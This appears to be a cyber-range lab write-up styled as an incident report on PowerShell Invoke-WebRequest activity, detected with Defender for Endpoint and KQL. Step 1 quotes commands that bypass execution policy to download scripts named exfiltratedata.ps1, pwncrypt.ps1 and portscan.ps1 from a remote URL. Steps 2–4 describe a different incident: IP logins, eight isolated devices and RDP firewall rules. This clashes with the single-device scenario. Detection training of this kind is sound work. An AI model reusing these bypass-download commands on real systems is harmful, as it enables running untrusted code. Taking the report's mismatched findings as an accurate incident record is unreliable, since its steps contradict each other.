<img width="600" src="https://github.com/user-attachments/assets/3139ed02-bf2c-4d30-973e-12dc1063fcba" alt="Incident Response Lifecycle"/>

# Incident Response Report: PowerShell Suspicious Web Request

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Microsoft Sentinel

##  Scenario

Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machined display incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 

### High-Level Incident Response Plan

- **Check `DeviceProcessEvents`** for any PowerShell executions involving the `Invoke-WebRequest`command and investigate any suspicious download activity.
- **Check `DeviceProcessEvents`** for any successful execution of downloaded scripts to assess potential impact.
- **If applicable, `isolate affected devices`, `block access to malicious domains`, `run an antimalware scan`, and `implement restrictions on PowerShell usage`** to prevent unauthorized script execution.

---

## Steps Taken

### 1. Searched the `DeviceProcessEvents` Table

Searched for instances within the last 24 hours where PowerShell was downloaded using the `Invoke-WebRequest` command for Device: "Windows-Target-1". Identified 24 such incidents, where the following commands were executed: 

a)InitiatingProcessCommandLine
            
        "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1


b)ProcessCommandLine
            
        powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1


The suspicious  web request was triggered on 1 device: "Windows-Target-1 by 1 user, but downloaded 4 different scripts with 4 different commands

 windows-target-1
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
 
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
 
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
 
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1



**Query used to locate events:**

![image](https://github.com/user-attachments/assets/fd5b08dc-4b2b-4b06-ad0c-24801f09a2ea)

<p>
<img src="https://github.com/user-attachments/assets/f70f72a2-79eb-450a-bb2c-4efcc849507d"  alt="KQL Query Results"/> &emsp; &emsp;
<img src="https://github.com/user-attachments/assets/74e652dd-2033-44ea-aacb-82e787cc2cf6"   alt="KQL Query Results"/>
</p>


---

### 2. Searched the `DeviceProcessEvents` Table a Second Time

Searched for instances where the following scripts within the last 5 hours to see if the malicious IP addresses discovered in Step 1 successfully logged into any devices. No successful logins were detected from these IP addresses.

**Query used to locate events:**

![image](https://github.com/user-attachments/assets/49941831-9220-4af4-8cea-7b20498a80c0)

![image](https://github.com/user-attachments/assets/c7602fa3-db3e-4ef1-aa10-5e8f5e7f79a6)

---

### 3. Isolated the affected devices in Microsoft Defender

All 8 impacted devices were isolated in Microsoft Defender for Endpoint, and an antimalware scan was run to ensure no malware was present.

**Ex. 1: Device: win-vm-grand:**
![image](https://github.com/user-attachments/assets/759080c1-42e8-4875-bae7-c6fef186d571)

---

### 4. Updated NSG(network security group) attached to the virtual machine

The network security group (NSG) rules were updated to block RDP access from the public internet. RDP is now only accessible from authorized home IP addresses to maintain secure remote access. As a result, any RDP attempt from unauthorized IP addresses will be denied by a default deny rule at the bottom of the NSG rule list.

![image](https://github.com/user-attachments/assets/aaef6360-8393-48cd-bd03-2b5deb64321d)

A corporate policy proposal was also submitted to enforce this configuration for all virtual machines moving forward.

---

### 5. Restored impacted virtual machines

Reviewed and completed write-up for incident resolution. Finalized reporting and closed out the incident in Microsoft Sentinel as a true positive.

![image](https://github.com/user-attachments/assets/5e6c7a40-2dba-4bae-b12c-8a943c56c7b7)









